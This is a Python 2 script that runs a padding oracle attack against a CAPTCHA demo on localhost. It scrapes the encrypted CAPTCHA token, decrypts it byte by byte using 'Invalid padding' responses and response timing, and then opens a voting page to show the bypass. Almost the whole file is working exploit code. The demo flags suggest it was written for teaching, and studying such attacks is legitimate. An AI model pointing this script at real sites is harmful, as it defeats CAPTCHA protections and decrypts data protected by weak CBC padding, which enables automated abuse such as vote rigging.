#!/usr/bin/env python
from __future__ import division
import base64, sys, io, time, webbrowser, urllib
import requests
from bs4 import BeautifulSoup
from PIL import Image
import cv2
import numpy as np
import argparse

SB_LENGTH = 16
DEFAULT_PADDING_CHAR = "+"

'''
    Print cipher using colors and index
'''
def print_colored( cipher, idx ):
    print " ".join([
            red(cipher[:idx*2]), # c' block which we haven't touched yet
            blue(cipher[idx*2:idx*2+2]), # current bytes being modified
            green(cipher[idx*2+2:])]) # bytes we already found

'''
    Return blue text from provided string
'''
def blue( s ):
    return "\033[00;34m{}\033[00m".format(s)

'''
    Return green text from provided string
'''
def green( s ):
    return "\033[01;32m{}\033[00m".format(s)

'''
    Return red text from provided string
'''
def red( s ):
    return "\033[01;31m{}\033[00m".format(s)

'''
    Take in base64 string and return PIL image
'''
def stringToImage( base64_string ):
    return Image.open(io.BytesIO(base64.b64decode(base64_string)))

'''
    Convert PIL Image to an RGB image( technically a numpy array ) that's compatible with opencv
'''
def toRGB( image ):
    return cv2.cvtColor(np.array(image), cv2.COLOR_BGR2RGB)

'''
    Split cipher into blocks of specified length
'''
def split_len( cipher, length=SB_LENGTH ):
    return [cipher[i:i+length] for i in range(0, len(cipher), length)]

'''
    Get html response from oracle link
'''
def ask_oracle( url ):
    t_s = time.time()
    r = requests.get(url)
    t_r = time.time()
    if r.status_code != 200:
        raise ValueError("Invalid response from url : [{}] \n{}".format(
            str(r.status_code),
            r.text))
    return r.text, (t_r - t_s)

def rtt_within(rtt, tmp_rtt, perc=50):
    return ( tmp_rtt < rtt * ((100+perc)/100) ) and ( tmp_rtt > rtt * ((100-perc)/100) )

'''
    Check if our ciphertext is valid by send it at to specifiec url
    And checking the returned value doesn't contain the words specified
    in verification
'''
def is_valid_cipher( cipher, oracle, verify_txt, b_rtt ):
    tmp_txt, tmp_rtt = ask_oracle( oracle + urllib.quote( base64.b64encode(cipher) ) )
    return verify_txt not in tmp_txt and rtt_within(b_rtt, tmp_rtt)

'''
    Convert plain list of ints to chars
    And convert pad to '+' or specified char
'''
def compute_word( plain, padding=DEFAULT_PADDING_CHAR ):
    return "".join([chr(c) if (c > 0x08) else padding for c in plain])

'''
    Run padding oracle attack
'''
def attack( cipher, oracle, verification, rtt, block_length=SB_LENGTH ):
    cipher_block = split_len( cipher, length=block_length )

    # At least 2 blocks required to be able to decypher msg
    if len(cipher_block) == 1:
        print ">> At least 2 cypher blocks required"
        exit()

    results = []

    for i in range(0, len(cipher_block)):
        if i + 1 == len(cipher_block):
            break
        a = len(cipher_block) - 1
        prevblock = cipher_block[a-i-1]
        block = cipher_block[a-i]

        ivals = []
        plain = []
        cprime = chr(0)*SB_LENGTH

        for cprime_idx in range( SB_LENGTH - 1, -1, -1 ):
            # Create a PKCS#7 padding index [0x01, 0x08]
            padding_idx = SB_LENGTH - cprime_idx

            for guess in range(256):
                # Create new ciphertext with the guess
                if cprime_idx > 0:
                    ciphertext = cprime[:cprime_idx]
                    ciphertext += chr(guess)
                else:
                    ciphertext = chr(guess)

                # Insert the previous intermediate values
                for intr in ivals:
                    # Adjust them for this padding index
                    ciphertext += chr(intr^padding_idx)

                # Append the block we're cracking
                ciphertext += block

                sys.stdout.write("\033[F") # Cursor up one line
                print_colored(ciphertext.encode("hex"), cprime_idx)

                # If the oracle correctly decrypts the ciphertext
                if is_valid_cipher( ciphertext, oracle, verification, rtt ):
                    # Calculate the intermediate value
                    intermediate = guess^padding_idx
                    # Save the intermediate value
                    ivals.insert(0, intermediate)
                    # Crack the plain text character
                    plain.insert(0, intermediate^ord(prevblock[cprime_idx]))

                    # We found it, bail out
                    if cprime_idx:
                        print

                    break

        print "  " + green(ciphertext.encode("hex")) # print final decoded cipher

        print "\nIntermediate values = {}\n".format(ivals)

        plainstr = compute_word(plain)
        results.append(plainstr)

    return results

DEMO_MODE = 1

def get_base_rtt( url, tests=5 ):
    res = []
    for _ in range(0, tests):
        t_s = time.time()
        requests.get(url)
        t_r = time.time()

        rtt = t_r - t_s

        print "{}. {}".format(_, rtt)

        res.append(rtt)
    return sum(res) / len(res)

def main():
    result = requests.get("http://localhost:8888/register-get.php")
    soup = BeautifulSoup(result.content, 'lxml')

    input = soup.find(id="captcha-verification")
    b64img = soup.find(id="captcha-img")

    oracle = "http://localhost:8888/verify-captcha.php?captcha-verification="
    verification = "Invalid padding"

    # DEMO DEBUG: Opens an image with the captcha it's trying to crack
    if DEMO_MODE:
        cvimg = stringToImage(b64img['src'].split("base64,")[1])
        cv2.imshow('Image', toRGB(cvimg))
        cv2.waitKey(0)

    cipher = base64.b64decode(input['value'])

    print "Calculating base rtt:"
    base_rtt = get_base_rtt( oracle + urllib.quote( input['value'] ) )
    print "Base rtt: {}".format(base_rtt)

    print
    word = attack( cipher, oracle, verification, base_rtt )

    print "Captcha word is : {} ('+' represents padding)".format("".join(reversed(word)))

    print green("[Done]")

    # DEMO DEBUG: Opens a webbrowser tab with the votepage to simulate login
    if DEMO_MODE:
        cv2.waitKey(0)
        webbrowser.open('http://localhost:8888/vote.html')
        time.sleep(1337) # wait so the picture window stays open and we can explain

#
#
# def menu():
#     start_url = "http://localhost:8888/register-get.php"
#     oracle = "http://localhost:8888/verify-captcha.php?captcha-verification="
#     verification = "Invalid padding"
#
#     # text_verification = "Invalid padding"
#     print "~~~~~~~~~~~~~~~~~~~~~~~~~~\n" + \
#           "~ Starting Oracle Tester ~\n" + \
#           "~~~~~~~~~~~~~~~~~~~~~~~~~~"
#
#     while True:
#         actions = {1:"Check if exploitable",2:"Attack Oracle"}
#
#         for action, txt in actions.items():
#             print "{}. {}".format(action, txt)
#
#         input = raw_input("option: ")
#
#         if int(input) in actions:
#             if int(input) == 1:
#                 check_oracle()
#             elif int(input) == 2:
#                 attack_oracle()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Padding Oracle Attack')
    parser.add_argument('-b','-base-url', default="http://localhost:8888/register-get.php")
    parser.add_argument('-v','-verification-txt', default="captcha-verification")
    parser.add_argument('-i', '-captcha-image', default="captcha-img")
    parser.add_argument('-o', '-oracle', default="http://localhost:8888/verify-captcha.php?captcha-verification=")
    parser.add_argument('-t', '-text-verification', default="Invalid padding")

    main()
